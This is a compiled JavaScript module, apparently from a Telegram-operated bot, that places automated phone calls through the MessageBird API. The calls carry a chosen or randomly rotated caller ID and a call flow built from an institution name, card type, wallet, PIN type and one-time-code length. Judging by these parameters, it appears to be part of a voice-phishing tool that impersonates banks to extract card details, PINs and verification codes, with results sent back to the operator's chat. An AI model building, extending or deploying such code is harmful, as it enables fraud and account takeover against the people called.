"use strict";
var __awaiter = (this && this.__awaiter) || function(thisArg, _arguments, P, generator) {
  function adopt(value) { return value instanceof P ? value : new P(function(resolve) { resolve(value); }); }
  return new (P || (P = Promise))(function(resolve, reject) {
    function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
    function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
    function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
    step((generator = generator.apply(thisArg, _arguments || [])).next());
  });
};
var __importDefault = (this && this.__importDefault) || function(mod) {
  return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.messagebirdMakeACall = exports.messagebird = void 0;
const messagebird_1 = __importDefault(require("messagebird"));
const __1 = require("..");
const answer_1 = require("../server/answer");
exports.messagebird = (0, messagebird_1.default)(process.env.MESSAGEBIRD_API_KEY);
const messagebirdMakeACall = ({ institutionName, to, from, step, wallet, cardType, askCardInfo, chatId, transferNumber, pinType, customMessage, actions, language, otpLength, }) => __awaiter(void 0, void 0, void 0, function*() {
  var _a;
  const flow = (0, answer_1.answer)({
    institutionName,
    from,
    step,
    wallet,
    cardType,
    askCardInfo,
    chatId,
    transferNumber,
    pinType,
    customMessage,
    actions,
    language,
    otpLength,
  });
  const numbers = (_a = process.env.MESSAGEBIRD_NUMBERS) === null || _a === void 0 ? void 0 : _a.split(`,`);
  return exports.messagebird.calls.create({
    source: to[0] === `1`
      ? numbers
        ? numbers[Math.floor(Math.random() * numbers.length)]
        : ``
      : from,
    destination: to,
    callFlow: flow,
    webhook: {
      url: `${process.env.ENDPOINT_URL}/calls/${chatId}`,
      token: process.env.MESSAGEBIRD_TOKEN,
    },
  }, (err, res) => __awaiter(void 0, void 0, void 0, function*() {
    var _b;
    if (err) {
      console.log(err);
      yield __1.bot.telegram.sendMessage(chatId, `Something went wrong try again later.`);
      yield ((_b = __1.bot.context.scene) === null || _b === void 0 ? void 0 : _b.enter('super-wizard'));
      return;
    }
    console.log(res);
    yield __1.bot.telegram.sendMessage(chatId, `Calling (${to}) 📞`);
  }));
});
exports.messagebirdMakeACall = messagebirdMakeACall;
